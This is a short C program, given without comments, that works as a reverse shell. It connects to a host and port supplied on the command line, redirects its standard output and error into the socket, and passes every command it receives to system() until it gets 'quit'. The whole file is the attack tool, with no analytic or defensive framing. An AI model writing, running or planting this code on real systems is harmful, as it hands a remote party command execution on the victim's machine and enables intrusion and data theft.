#include <stdlib.h>
#include <stdio.h>
#include <error.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <resolv.h>

int main (int argc, char **argv) {
    struct sockaddr_in sock;
    int sd;
    char command[256];
    
    if (argc < 3) {
    printf("%s <host> <port>\n", argv[0]);
    return 1;
    }
    
    close(1);
    
    if ((sd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
    perror(argv[0]);
    return 1;
    }
    
    bzero(&sock, sizeof(sock));
    
    sock.sin_family = AF_INET;
    sock.sin_port = htons(atoi(argv[2]));
    inet_aton(argv[1], &sock.sin_addr);
    
    if (connect(sd, (struct sockaddr *)&sock, sizeof(sock))) {
    perror(argv[0]);
    return 1;
    }
    
    close(2);
    dup(sd);
    bzero(command, 256);
    while (recv(sd, command, 255, 0) && strncmp(command, "quit", 4)) {
    system(command);
    bzero(command, 256);
    }
    
    close(sd);
    return 0;
}